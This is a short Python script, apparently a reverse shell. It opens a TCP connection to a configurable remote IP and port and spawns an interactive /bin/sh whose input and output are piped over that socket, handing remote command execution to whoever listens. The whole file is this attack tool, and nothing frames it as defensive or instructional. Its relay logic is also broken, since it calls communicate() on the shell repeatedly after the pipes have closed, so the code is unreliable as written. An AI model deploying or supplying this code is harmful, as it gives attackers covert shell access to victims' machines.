import socket
import subprocess

# Replace this IP address and port with your own
REMOTE_HOST = '192.168.1.100'
REMOTE_PORT = 1234

# Create a socket object and connect to the remote host
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((REMOTE_HOST, REMOTE_PORT))

# Start a shell process and redirect its input and output to the socket
shell = subprocess.Popen(['/bin/sh', '-i'], stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
stdout, stderr = shell.communicate(input=sock.recv(1024))

# Loop over the socket and shell, sending data between them
while True:
    # Receive data from the socket and send it to the shell
    data = sock.recv(1024)
    if not data:
        break
    shell.stdin.write(data)
    shell.stdin.flush()

    # Read output from the shell and send it to the socket
    stdout, stderr = shell.communicate()
    sock.send(stdout)
    sock.send(stderr)

# Close the socket and shell
sock.close()
shell.stdin.close()
shell.stdout.close()
shell.stderr.close()
